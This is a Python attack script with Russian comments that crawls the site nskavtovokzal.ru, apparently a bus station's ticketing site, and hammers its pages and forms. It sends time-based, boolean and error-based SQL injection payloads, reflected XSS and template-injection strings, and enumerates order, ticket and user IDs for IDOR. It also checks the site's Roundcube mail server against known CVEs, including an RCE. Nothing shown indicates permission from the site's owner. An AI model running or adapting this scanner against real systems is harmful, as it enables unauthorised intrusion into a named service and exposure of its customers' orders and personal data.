#!/usr/bin/env python3
"""Deep SQL Injection tester using requests"""
import requests, time, re, os, json
import urllib3
urllib3.disable_warnings()

PROXIES = {'https': os.environ.get('HTTPS_PROXY'), 'http': os.environ.get('HTTPS_PROXY')}
CA = '/root/.ccr/ca-bundle.crt'
TARGET = "https://nskavtovokzal.ru"
OUT = "recon_results/nskavtovokzal.ru"
os.makedirs(OUT, exist_ok=True)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,*/*",
}

FINDINGS = []

def req(url, params=None, data=None, method="GET", timeout=15):
    try:
        if method == "GET":
            r = requests.get(url, params=params, headers=HEADERS,
                           verify=CA, proxies=PROXIES, timeout=timeout,
                           allow_redirects=True)
        else:
            r = requests.post(url, data=data, headers=HEADERS,
                            verify=CA, proxies=PROXIES, timeout=timeout,
                            allow_redirects=True)
        return r
    except Exception as e:
        print(f"  [ERR] {e}")
        return None

def finding(sev, title, detail=""):
    FINDINGS.append({"severity": sev, "title": title, "detail": detail})
    icon = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🔵","INFO":"⚪"}.get(sev, "?")
    print(f"  {icon} [{sev}] {title}")
    if detail:
        print(f"        {detail[:200]}")

# ── URL из sitemap ───────────────────────────────────────────────
print("[+] Получаем все URL из sitemap...")
r = req(f"{TARGET}/sitemap.xml")
urls = re.findall(r'<loc>([^<]+)</loc>', r.text if r else "")
print(f"  Найдено {len(urls)} URL")

# Дополнительные URL из gobuster
extra_urls = [
    f"{TARGET}/news-page",
    f"{TARGET}/news",
    f"{TARGET}/order-flight",
    f"{TARGET}/login",
    f"{TARGET}/profile",
]
all_urls = list(set(urls + extra_urls))

# Собираем параметры из всех страниц
print("[+] Собираем параметры со всех страниц...")
params_map = {}
for url in all_urls[:30]:
    r = req(url)
    if not r or r.status_code not in (200,):
        continue
    # GET параметры из ссылок
    found_params = re.findall(r'\?([^"\'<>\s]+)', r.text)
    for qstr in found_params:
        for part in qstr.split('&'):
            if '=' in part:
                k = part.split('=')[0]
                if k not in params_map:
                    params_map[k] = url
    # Параметры из форм
    form_inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)', r.text)
    for inp in form_inputs:
        if inp not in params_map:
            params_map[inp] = url

print(f"  Найдено {len(params_map)} параметров: {list(params_map.keys())[:20]}")

# ── Time-based Blind SQLi ──────────────────────────────────────────
print("\n[+] Time-Based Blind SQL Injection...")

SLEEP_PAYLOADS = [
    "1; SELECT SLEEP(3)-- -",
    "1' AND SLEEP(3)-- -",
    "1\" AND SLEEP(3)-- -",
    "1 AND SLEEP(3)-- -",
    "1); SELECT SLEEP(3)-- -",
    "1'; WAITFOR DELAY '0:0:3'-- -",  # MSSQL
    "1; pg_sleep(3)-- -",              # PostgreSQL
    "1 RLIKE SLEEP(3)-- -",
    "1 AND 1=1 UNION SELECT SLEEP(3),NULL,NULL-- -",
    "'; SELECT pg_sleep(3)--",
]

# Конкретные уязвимые endpoints
test_cases = [
    (f"{TARGET}/news-page", {"id": ""}),
    (f"{TARGET}/news", {"id": ""}),
    (f"{TARGET}/schedule", {"from": "", "to": "", "date": ""}),
    (f"{TARGET}/order-flight", {"id": ""}),
]

# Добавляем из sitemap параметры
for url in all_urls[:20]:
    parsed_params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=([^&"\'<>\s]*)', url)
    if parsed_params:
        base = url.split('?')[0]
        params = {k: v for k, v in parsed_params}
        test_cases.append((base, params))

confirmed_sqli = []

for base_url, base_params in test_cases:
    for param in list(base_params.keys()):
        # Baseline
        test_p = dict(base_params)
        test_p[param] = "1"
        r0 = req(base_url, params=test_p)
        if not r0:
            continue
        baseline = r0.elapsed.total_seconds()

        for payload in SLEEP_PAYLOADS[:5]:
            test_p2 = dict(base_params)
            test_p2[param] = payload

            start = time.time()
            r1 = req(base_url, params=test_p2, timeout=20)
            elapsed = time.time() - start

            if r1 and elapsed >= 2.5 and elapsed < 15:
                detail = f"URL: {base_url}?{param}=...\nPayload: {payload}\nЗадержка: {elapsed:.1f}с (baseline: {baseline:.1f}с)"
                finding("CRITICAL", f"Time-Based SQL Injection: {base_url} param={param}", detail)
                confirmed_sqli.append({"url": base_url, "param": param, "payload": payload})
                break

# ── Boolean-Based Blind SQLi ───────────────────────────────────────
print("\n[+] Boolean-Based Blind SQL Injection...")

BOOL_TRUE  = ["1 AND 1=1", "1' AND '1'='1", "1 AND 1=1-- -", "1' OR '1'='1"]
BOOL_FALSE = ["1 AND 1=2", "1' AND '1'='2", "1 AND 1=2-- -", "1' OR '1'='2"]

for base_url, base_params in test_cases[:5]:
    for param in list(base_params.keys()):
        p_true  = dict(base_params); p_true[param]  = BOOL_TRUE[0]
        p_false = dict(base_params); p_false[param] = BOOL_FALSE[0]
        p_orig  = dict(base_params); p_orig[param]  = "1"

        r_true  = req(base_url, params=p_true)
        r_false = req(base_url, params=p_false)
        r_orig  = req(base_url, params=p_orig)

        if not all([r_true, r_false, r_orig]):
            continue

        len_true  = len(r_true.text)
        len_false = len(r_false.text)
        len_orig  = len(r_orig.text)

        # Если true≈orig и false≠orig — boolean blind
        diff_true  = abs(len_true  - len_orig)
        diff_false = abs(len_false - len_orig)

        if diff_false > 500 and diff_true < 200:
            detail = f"URL: {base_url}\nParam: {param}\nОтвет TRUE={len_true}b FALSE={len_false}b ORIG={len_orig}b"
            finding("CRITICAL", f"Boolean-Based Blind SQLi: {base_url} param={param}", detail)
        elif diff_false > 200 and diff_true < 100:
            detail = f"URL: {base_url}\nParam: {param}\nDiff FALSE: {diff_false}b"
            finding("HIGH", f"Возможный Boolean-Based SQLi: {base_url} param={param}", detail)

# ── Error-Based SQLi ───────────────────────────────────────────────
print("\n[+] Error-Based SQL Injection...")

ERROR_PAYLOADS = [
    "'",
    "\"",
    "1'",
    "1\"",
    "1`",
    "' OR 1=1-- -",
    "') OR 1=1-- -",
    "1; SELECT @@version-- -",
    "1 UNION SELECT NULL,NULL,NULL-- -",
    "1 UNION SELECT NULL,@@version,NULL-- -",
    "1 AND extractvalue(1,concat(0x7e,version()))-- -",
    "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
]

ERROR_PATTERNS = [
    r'you have an error in your sql syntax',
    r'warning.*mysql',
    r'unclosed quotation mark',
    r'pg_query\(\)',
    r'ora-\d{5}',
    r'microsoft.*odbc.*sql server',
    r'sqlite.*error',
    r'syntax error.*near',
    r'invalid.*column',
    r'mysql_fetch',
    r'supplied argument is not a valid mysql',
    r'column.*ambiguously defined',
    r'extractvalue.*xpath',
    r'updatexml.*xpath',
    r'division by zero',
]

for base_url, base_params in test_cases[:5]:
    for param in list(base_params.keys()):
        for payload in ERROR_PAYLOADS:
            p = dict(base_params)
            p[param] = payload
            r = req(base_url, params=p)
            if not r:
                continue
            body_lower = r.text.lower()
            for pat in ERROR_PATTERNS:
                if re.search(pat, body_lower):
                    m = re.search(pat, body_lower)
                    detail = f"URL: {base_url}?{param}={payload}\nPattern: {pat}\nMatch: {m.group()[:100]}"
                    finding("CRITICAL", f"Error-Based SQLi: {base_url} param={param}", detail)
                    break

# ── IDOR ──────────────────────────────────────────────────────────
print("\n[+] IDOR Testing...")

# Получить свой session cookie
s = requests.Session()
r_login = s.get(f"{TARGET}/login", verify=CA, proxies=PROXIES, timeout=10, headers=HEADERS)
session_cookie = s.cookies.get('PHPSESSID', '')

# Тест IDOR на числовые ID
idor_endpoints = [
    "/order/{id}",
    "/ticket/{id}",
    "/profile/{id}",
    "/user/{id}",
    "/api/order/{id}",
    "/api/user/{id}",
    "/order-flight?id={id}",
    "/news-page?id={id}",
]

idor_results = []
for ep_template in idor_endpoints:
    responses = {}
    for test_id in [1, 2, 3, 100, 9999, 99999]:
        ep = ep_template.replace("{id}", str(test_id))
        url = TARGET + ep if ep.startswith('/') else TARGET + '/' + ep
        r = req(url)
        if r and r.status_code == 200 and len(r.text) > 500:
            responses[test_id] = len(r.text)

    # Если разные ID дают разные ответы — возможный IDOR
    if len(responses) >= 2:
        sizes = list(responses.values())
        if max(sizes) - min(sizes) > 100:
            finding("MEDIUM", f"Возможный IDOR: {ep_template}",
                   f"Разные ID дают разные ответы: {responses}")
            idor_results.append(ep_template)

# ── XSS глубокий тест ─────────────────────────────────────────────
print("\n[+] XSS — углублённый тест всех форм и параметров...")

XSS_PAYLOADS = [
    '<script>alert(document.domain)</script>',
    '"><script>alert(1)</script>',
    "'><svg onload=alert(1)>",
    '<img src=x onerror=alert(1)>',
    '{{7*7}}',  # SSTI
    '${7*7}',   # SSTI Java
    '#{7*7}',   # SSTI Ruby/Thymeleaf
    '<iframe src=javascript:alert(1)>',
    '";alert(1);//',
    '\';alert(1);//',
]

# Поиск всех форм
xss_found = []
for url in all_urls[:20]:
    r = req(url)
    if not r or r.status_code != 200:
        continue

    # Найти формы
    forms = re.findall(r'<form[^>]*action=["\']?([^"\'> ]+)["\']?[^>]*>(.*?)</form>',
                       r.text, re.DOTALL | re.IGNORECASE)
    for action, form_body in forms:
        inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)', form_body, re.IGNORECASE)
        textareas = re.findall(r'<textarea[^>]+name=["\']([^"\']+)', form_body, re.IGNORECASE)
        all_fields = inputs + textareas

        form_url = action if action.startswith('http') else TARGET + action

        for payload in XSS_PAYLOADS[:4]:
            data = {f: payload for f in all_fields}
            if not data:
                data = {"q": payload, "search": payload}
            r2 = req(form_url, data=data, method="POST")
            if r2 and payload in r2.text and r2.status_code == 200:
                finding("HIGH", f"Reflected XSS в форме: {form_url}", f"Payload: {payload}")
                xss_found.append({"url": form_url, "payload": payload})
                break

    # GET параметры XSS
    links = re.findall(r'href=["\']([^"\']+\?[^"\']+)', r.text, re.IGNORECASE)
    for link in links[:10]:
        if not link.startswith('http'):
            link = TARGET + link if link.startswith('/') else TARGET + '/' + link
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(link)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in XSS_PAYLOADS[:3]:
                p2 = dict(params)
                p2[param] = [payload]
                new_url = urlunparse(parsed._replace(query=urlencode(p2, doseq=True)))
                r2 = req(new_url)
                if r2 and payload in r2.text and r2.status_code == 200:
                    finding("HIGH", f"Reflected XSS в GET параметре {param}", f"URL: {new_url}")
                    xss_found.append({"url": new_url, "payload": payload})
                    break

# ── SSTI проверка ─────────────────────────────────────────────────
print("\n[+] SSTI (Server-Side Template Injection)...")
SSTI_PAYLOADS = {
    "{{7*7}}": "49",
    "${7*7}": "49",
    "#{7*7}": "49",
    "{{7*'7'}}": "7777777",
    "{{config}}": "SECRET",
}
for base_url, base_params in test_cases[:5]:
    for param in list(base_params.keys()):
        for payload, expected in SSTI_PAYLOADS.items():
            p = dict(base_params); p[param] = payload
            r = req(base_url, params=p)
            if r and expected in r.text:
                finding("CRITICAL", f"SSTI: {base_url} param={param}",
                       f"Payload: {payload} → ответ содержит: {expected}")

# ── Roundcube CVE ──────────────────────────────────────────────────
print("\n[+] Roundcube Webmail — проверка CVE...")
# CVE-2023-43770, CVE-2024-37383 — XSS
# CVE-2023-5631 — RCE via IMAP
roundcube_url = "https://mail.smtp.nskavtovokzal.ru"
r_rc = req(roundcube_url)
if r_rc and r_rc.status_code == 200:
    # Версия
    ver_match = re.search(r'Roundcube Webmail (\d+\.\d+\.\d+)', r_rc.text)
    if ver_match:
        ver = ver_match.group(1)
        parts = list(map(int, ver.split('.')))
        finding("INFO", f"Roundcube версия: {ver}", roundcube_url)
        if parts[0] == 1 and parts[1] <= 6 and parts[2] < 7:
            finding("CRITICAL", f"Roundcube {ver} уязвим к CVE-2023-5631 (RCE via IMAP)",
                   "Authenticated RCE — нужен аккаунт")
        if parts[0] == 1 and parts[1] <= 6 and parts[2] < 6:
            finding("HIGH", f"Roundcube {ver} уязвим к CVE-2023-43770 (XSS)",
                   "Stored XSS через обработку email ссылок")
    else:
        finding("INFO", "Roundcube версия не определена", roundcube_url)

    # Проверка login страницы
    login_r = req(f"{roundcube_url}/?_task=login")
    if login_r:
        token = re.search(r'name="_token" value="([^"]+)"', login_r.text)
        finding("INFO", "Roundcube login доступен", f"CSRF token: {'да' if token else 'нет'}")

# ── Итог ───────────────────────────────────────────────────────────
print("\n" + "="*60)
print("ИТОГ SQLi & IDOR & XSS ТЕСТИРОВАНИЯ")
print("="*60)
sev_order = ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]
for sev in sev_order:
    items = [f for f in FINDINGS if f['severity']==sev]
    if items:
        icon = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🔵","INFO":"⚪"}[sev]
        print(f"\n{icon} {sev} ({len(items)}):")
        for f in items:
            print(f"  - {f['title']}")

# Сохранить
with open(f"{OUT}/deep_scan_findings.json", "w") as f:
    json.dump(FINDINGS, f, ensure_ascii=False, indent=2)
print(f"\nСохранено в {OUT}/deep_scan_findings.json")
